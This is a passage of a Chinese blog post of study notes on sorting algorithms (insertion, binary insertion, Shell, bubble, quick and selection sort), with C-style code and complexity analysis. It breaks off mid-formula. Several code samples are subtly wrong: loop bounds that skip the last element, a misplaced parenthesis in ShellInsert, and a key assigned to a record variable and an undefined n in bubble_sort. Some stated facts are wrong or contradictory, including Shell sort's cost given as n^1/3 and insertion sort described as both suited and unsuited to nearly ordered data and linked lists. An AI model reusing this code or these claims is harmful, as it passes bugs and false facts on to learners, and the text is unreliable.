    <content type="html"><![CDATA[<h1>排序</h1><img src="/2024/02/19/%E6%8E%92%E5%BA%8F/1.jpg" class=""><img src="/2024/02/19/%E6%8E%92%E5%BA%8F/3.jpg" class=""><h1>定义</h1><p>记录以顺序表存储</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 20  <span class="hljs-comment">//记录数量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> KeyType;  <span class="hljs-comment">//设关键字为int型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> InfoType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>  <span class="hljs-comment">//定义每个记录（数据元素）的结构</span><br>KeyType key;  <span class="hljs-comment">//关键字</span><br>InfoType otherinfo;<span class="hljs-comment">//其他数据项</span><br>&#125;RedType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>  <span class="hljs-comment">//定义顺序表的结构</span><br>RedType r[MAXSIZE + <span class="hljs-number">1</span>];  <span class="hljs-comment">//存储顺序表的向量，r[0]一般作烧饼或缓冲区</span><br><span class="hljs-type">int</span> length;  <span class="hljs-comment">//顺序表的长度</span><br>&#125;SqList;<br></code></pre></td></tr></table></figure><h1>插入排序</h1><h4 id="基本思想：">基本思想：</h4><p>每步将一个待排序对象，按其关键码大小，插入到前面已经排好序的一组对象的适当位置上，直到对象全部插入为止（即边插入边排序，保证子序列中随时都是排好序的）</p><h4 id="分类：">分类：</h4><h6 id="直接插入排序">直接插入排序</h6><ul><li><p>步骤：</p><p>:one:在R[1…i-1]中查找R[i]的插入位置，R[1…j].key &lt;= R[i].key &lt; R[j+1…i-1].key</p><p>:two:将R[j+1…i-1]中的所有记录均后移一个位置</p><p>:three:将R[i] 插入到R[j+1]的位置上</p></li><li><p>算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">InserSort</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br><span class="hljs-type">int</span> i, j;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;L.length;i++)<br><span class="hljs-keyword">if</span> (L.r[i].key &lt; L.r[i - <span class="hljs-number">1</span>].key)  <span class="hljs-comment">//将L.r[i]插入有序子表</span><br>&#123;<br>L.r[<span class="hljs-number">0</span>] = L.r[i];  <span class="hljs-comment">//复制为哨兵</span><br>L.r[i] = L.r[i - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (j = i - <span class="hljs-number">2</span>; L.r[<span class="hljs-number">0</span>].key &lt; L.r[j].key; j--)<br>L.r[j + <span class="hljs-number">1</span>] = L.r[j];  <span class="hljs-comment">//记录后移</span><br>L.r[j + <span class="hljs-number">1</span>] = L.r[<span class="hljs-number">0</span>];  <span class="hljs-comment">//插入到正确位置</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>算法分析：</p><ul><li><p>在平均情况下，直接插入排序关键字的比较次数和记录移动次数均约为：<strong>n^2^ /4</strong></p></li><li><p>时间复杂度为：<strong>O(n^2^ )</strong></p></li><li><p>空间复杂度为：<strong>O(1)</strong>  &lt;·····只需要一个记录的辅助空间r[0]</p></li><li><p>是一种<strong>稳定</strong>的排序方法</p></li><li><p>也适用于<strong>链式</strong>存储结构，只是在单链表上无需移动记录，只需修改相应的指针</p></li><li><p>更适合于**初始记录基本有序（正序）**的情况，当初始记录无序，n较大时，此算法时间复杂度较高，不宜采用</p></li><li><p>所以只能用于顺序结构，不能用于链式结构</p></li><li><p>适合<strong>初始记录无序、n较大</strong>时的情况</p></li></ul></li></ul><h6 id="折半插入排序">折半插入排序</h6><ul><li>算法：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">BInsertSort</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">2</span>; i &lt;= L.length; i++)<br>&#123;<br>L.r[<span class="hljs-number">0</span>] = L.r[i];<br>low = <span class="hljs-number">1</span>;<br>high = i - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (low &lt;= high)  <span class="hljs-comment">//在r[low..high]中折半查找有序插入的位置</span><br>&#123;<br>m = (low + high) / <span class="hljs-number">2</span>;  <span class="hljs-comment">//向下取整</span><br><span class="hljs-keyword">if</span> (L.r[<span class="hljs-number">0</span>].key &lt; L.r[m].key)high = m - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> low = m + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (j = i - <span class="hljs-number">1</span>; j &gt; high + <span class="hljs-number">1</span>; j--)L.r[j + <span class="hljs-number">1</span>] = L.r[j];<br>L.r[high + <span class="hljs-number">1</span>] = L.r[<span class="hljs-number">0</span>];<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>算法分析：<ul><li>时间复杂度为：<strong>O(n^2^ )</strong></li><li>空间复杂度为：<strong>O(1)</strong></li><li>是一种<strong>稳定</strong>的排序方法</li><li>当<strong>n较大</strong>时，总关键码比较次数比直接插入排序的最坏情况要好得多，但比其最好情况要差（总关键码比较次数：直接插入最好情况 &lt; 折半 &lt;&lt; 直接插入最坏情况）</li><li>在对象的<strong>初始</strong>排列已经按关键码排好序或<strong>接近有序</strong>时，直接插入排序比折半插入排 序执行的关键码比较次数要少</li><li>折半插入排序的对象<strong>移动次数</strong>与直接插入排序<strong>相同</strong>，依赖于对象的初始排列</li><li>减少了比较次数，但没有减少移动次数</li><li><strong>平均性能</strong>优于直接插入排序</li></ul></li></ul><h6 id="希尔排序">希尔排序</h6><ul><li><p>基本思想：</p><p>先将整个待排记录序列分割成若干子序列，分别进行<strong>直接插入排序</strong>，待整个序列中的记录“基本有序” 时，再对全体记录进行一次直接插入排序</p><ul><li>子序列的构成不是简单地”逐段分割”。而是，将相隔某个增量dk的记录组成一个子序列让增量dk逐趟缩短（例如依次取5,3,1）直到dk＝1为止</li><li>小元素跳跃式前移最后一趟增量为1时， 序列已基本有序平均性能优于直接插入排序</li></ul></li><li><p>算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">ShellInsert</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-type">int</span> dk)</span><br>&#123;<span class="hljs-comment">//对顺序表L进行一趟增量为dk的Shell排序，dk为步长因子</span><br><span class="hljs-keyword">for</span>(i=dk+<span class="hljs-number">1</span>;i&lt;=L.length;i++)  <span class="hljs-comment">//开始将r[i]插入有序增量子表</span><br><span class="hljs-keyword">if</span> (L.r[i].key &lt; L.r[i - dk].key) &#123;<br>L.r[<span class="hljs-number">0</span>] = L.r[i];<br><span class="hljs-keyword">for</span> (j = i - dk; j &gt; <span class="hljs-number">0</span> &amp;&amp; (L.r[<span class="hljs-number">0</span>].key &lt; L.r[j].key; j = j - dk))<br>L.r[j + dk] = L.r[j];  <span class="hljs-comment">//关键字较大的记录在子表中后移</span><br>L.r[j + dk] = L.r[<span class="hljs-number">0</span>];  <span class="hljs-comment">//在本趟结束时将r[i]插入到正确位置</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>:exclamation:注意：关于“一趟”：[0,0+dk)共dk组，每组都完成一次排序为“一趟”</p><p>​            r[0]只是暂存单元，不是哨兵，当j&lt;=0时，插入位置巳找到</p></li><li><p>算法分析：</p><ul><li>时间复杂度：未有定论。有人在大量的实验基础上推出：当 n 在某个特定范围内，希尔排序所需的比较和移动次数约为 **n^1/3^**当 n—&gt;∞ 时，可减少到 n(log~2~n)^2^</li><li>空间复杂度：O(1)&lt;·····只需要一个辅助空间r[0]</li><li>记录跳跃式地移动导致排序方法是<strong>不稳定</strong>的</li><li>只能用于<strong>顺序结构</strong>，不能用于链式结构</li><li>增量序列可以有各种取法，但应该使增量序列中的值没有除1之外的公因子，并且最后一个增量值必须等于1</li><li>适合<strong>初始记录无序、n较大</strong>时的情况</li></ul></li></ul><h6 id="总结：">总结：</h6><table><thead><tr><th style="text-align:left"></th><th style="text-align:left">直接插入排序</th><th>折半插入排序</th><th>希尔排序</th></tr></thead><tbody><tr><td style="text-align:left">时间复杂度</td><td style="text-align:left">O(n^2^ )</td><td>O(n^2^ )</td><td>未定</td></tr><tr><td style="text-align:left">空间复杂度</td><td style="text-align:left">O(1)</td><td>O(1)</td><td>O(1)</td></tr><tr><td style="text-align:left">稳定性</td><td style="text-align:left">稳定</td><td>稳定</td><td>不稳定</td></tr><tr><td style="text-align:left">使用场景</td><td style="text-align:left">初始记录无序、n较大</td><td>n较大，初始排列已经按关键码排好序或接近有序</td><td>始记录无序、n较大</td></tr></tbody></table><h1>交换排序</h1><h4 id="基本思想：-2">基本思想：</h4><p>两两比较，如果发生逆序则交换，直到所有记录都排好序为止</p><h4 id="分类：-2">分类：</h4><img src="/2024/02/19/%E6%8E%92%E5%BA%8F/4.jpg" class=""><h6 id="冒泡排序">冒泡排序</h6><p>算法：</p><ul><li><p>算法:one:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort</span><span class="hljs-params">(SqList &amp;L)</span> &#123;<br><span class="hljs-type">int</span> m, i, j;<br>RedType x;  <span class="hljs-comment">//交换时的临时空间</span><br><span class="hljs-keyword">for</span> (m = <span class="hljs-number">1</span>; m &lt;= n - <span class="hljs-number">1</span>; m++) &#123;  <span class="hljs-comment">//总共需要n-1趟</span><br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>;j&lt;=n-m;j++)<br><span class="hljs-keyword">if</span> (L.r[j].key &gt; L.r[j + <span class="hljs-number">1</span>].key) &#123;  <span class="hljs-comment">//发生逆序</span><br>x = L.r[j].key;<br>L.r[j] = L.r[j + <span class="hljs-number">1</span>];<br>L.r[j + <span class="hljs-number">1</span>] = x;  <span class="hljs-comment">//交换</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>算法:two:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort2</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br><span class="hljs-type">int</span> m, i, j, flag = <span class="hljs-number">1</span>;  <span class="hljs-comment">//flag作为是否有交换的标记</span><br>RedType x;<br>m = n - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> ((m &gt; <span class="hljs-number">0</span>) &amp;&amp; (flag == <span class="hljs-number">1</span>))<br>&#123;<br>flag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br><span class="hljs-keyword">if</span> (L.r[j].key &gt; L.r[j + <span class="hljs-number">1</span>].key)<br>&#123;<br>flag = <span class="hljs-number">1</span>;  <span class="hljs-comment">//发生交换，flag置为1，若本趟未发生交换，flag保持为0</span><br>x = L.r[j];  <span class="hljs-comment">//交换</span><br>L.r[j] = L.r[j + <span class="hljs-number">1</span>];<br>L.r[j + <span class="hljs-number">1</span>] = x;<br>&#125;<br>m--;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>每趟结束时，不仅能挤出一个最大值到最后面位置，还能同时部分理顺其他元素； 一旦下趟没有交换，还可提前结束排序</li></ul></li></ul><p>算法分析：</p><ul><li><p><strong>比较次数</strong>和<strong>移动次数</strong>与<strong>初始排列</strong>有关</p></li><li><p>最好情况下只需1趟排序，比较次数为 n-1，不移动</p></li><li><p>最坏情况下需 n-1趟排序，第i趟比较n-i次，移动3(n-i) 次</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo>−</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>、</mtext><mn>3</mn><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><mfrac><mn>3</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo>−</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{n-1}{(n-i)}=\frac{1}{2}(n^2-n)、3\sum_{i=1}^{n-1}{(n-i)}=\frac{3}{2}(n^2-n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">、</span><span class="mord">3</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p></li><li><p>时间复杂度：<strong>O(n^2^)</strong></p></li><li><p>空间复杂度：<strong>O(1)</strong></p></li><li><p><strong>稳定</strong>的排序方法</p></li></ul><p>:exclamation:注意：“一趟”排序指找到当前序列最小或最大的一个</p><h6 id="快速排序">快速排序</h6><ul><li><p>基本思想：</p><p>通过一趟排序，将待排序记录分割成独立的两部分，其中一部分记录的关键字均比另一部分记录的关键字小，则可分别对这两部分记录进行排序，以达到整个序列有序</p><p>:one:任取一个元素 (如第一个) 为中心</p><p>:two:所有比它小的元素一律前放，比它大的元素一律后放，形成左右两个子表</p><p>:three:对各子表重新选择中心元素并依此规则调整，直到每个子表的元素只剩一个</p></li><li><p>算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Partition</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span><br>&#123;<br>L.r[<span class="hljs-number">0</span>] = L.r[low];<br>pivotkey = L.r[low].key;<br><span class="hljs-keyword">while</span> (low &lt; high)<br>&#123;<br><span class="hljs-keyword">while</span> (low &lt; high&amp;&amp;L.r[high].key &gt;= pivotkey)high--;<br>L.r[low] = L.r[high];<br><span class="hljs-keyword">while</span> (low &lt;= high &amp;&amp; L.r[low].key &lt;= pivotkey)low++;<br>L.r[high] = L.r[low];<br>&#125;<br>L.r[low] = L.r[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">return</span> low;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">QSort</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span><br>&#123;<br><span class="hljs-keyword">if</span> (low &lt; high)<br>&#123;<br>pivotloc = Partition(L, low, high);<br>QSort(L, low, pivotloc - <span class="hljs-number">1</span>);<br>QSort(L, pivotloc + <span class="hljs-number">1</span>, high);<br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>QSort(L, <span class="hljs-number">1</span>, L.length);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>算法分析：</p><ul><li>平均计算时间是：<strong>O(nlog~2~n)</strong></li><li>实验结果表明： 就<strong>平均计算时间</strong>而言，快速排序是我们所讨论的所有<strong>内排序</strong>方法中最好的一个 :+1:</li><li>快速排序是<strong>递归</strong>的，需要有 一个栈存放每层递归调用时参数（新的 low和high）</li><li>最大递归调用层次数与<strong>递归树的深度</strong>一致， 因此，要求<strong>存储</strong>开销为：<strong>O(log~2~n)</strong></li><li>稳定性：<strong>不稳定</strong>，可选 任一元素为枢轴</li><li>分情况讨论：<ul><li>最好：划分后，左侧右侧子序列的长度相同，空间效率：O(log~2~n)</li><li>最坏：初始记录序列按关键字有序或基本有序，快速排序将蜕化为起泡排序。递归树成为单支树，每次划分只得到一个比上一次少一个 对象的子序列，必须经过 n-1 趟才能把所有对象定位，而且第 i 趟需要经过 n-i 次关键码比较才能找到第 i 个对象的安放位置。此时，栈的最大深度为n。O(n)。</li></ul></li></ul></li><li><p>:exclamation:注意：“一趟”指: 对一个（子）表完成排序，即对于一个元素，在比较区域内，左边均小，右边均大</p></li></ul><table><thead><tr><th></th><th>冒泡排序</th><th>快速排序</th></tr></thead><tbody><tr><td>时间复杂度</td><td>O(n^2^)</td><td>O(nlog~2~n)</td></tr><tr><td>空间复杂度</td><td>O(1)</td><td>O(n) ~ O(log~2~n)</td></tr></tbody></table><h1>选择排序</h1><h4 id="基本思想：-3">基本思想：</h4><p>每一趟在后面 n-i +1个中选出关键码最小的对象, 作为有序序列的第 i 个记录</p><h4 id="分类：-3">分类：</h4><img src="/2024/02/19/%E6%8E%92%E5%BA%8F/5.jpg" class=""><h6 id="简单选择排序">简单选择排序</h6><ul><li><p>算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">SelectSort</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; L.length; i++)<br><span class="hljs-comment">//在L.r[i..L.length] 中选择key最小的记录</span><br>&#123;<br>k = i;<br><span class="hljs-keyword">for</span> (j = i + <span class="hljs-number">1</span>; j &lt; L.length; j++)<br><span class="hljs-keyword">if</span> (L.r[j].key &lt; L.r[k].key)k = j;<br><span class="hljs-keyword">if</span> (k != i) &#123;  <span class="hljs-comment">//L.r[i]&lt;---&gt;L.r[k]</span><br>L.r[<span class="hljs-number">0</span>] = L.r[k];<br><span class="hljs-keyword">for</span> (j = k; j &gt; i; j--)L.r[j] = L.r[j - <span class="hljs-number">1</span>];<br>L.r[i] = L.r[<span class="hljs-number">0</span>];<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>算法分析：</p><p>:one:移动次数：最好情况：0；最坏情况：3(n-1)</p><p>:two:比较次数：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>x</mi><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></munderover><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo>−</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x\sum_{i=1}^{n-1}{(n-i)}=\frac{1}{2}(n^2-n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0788em;vertical-align:-1.2777em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 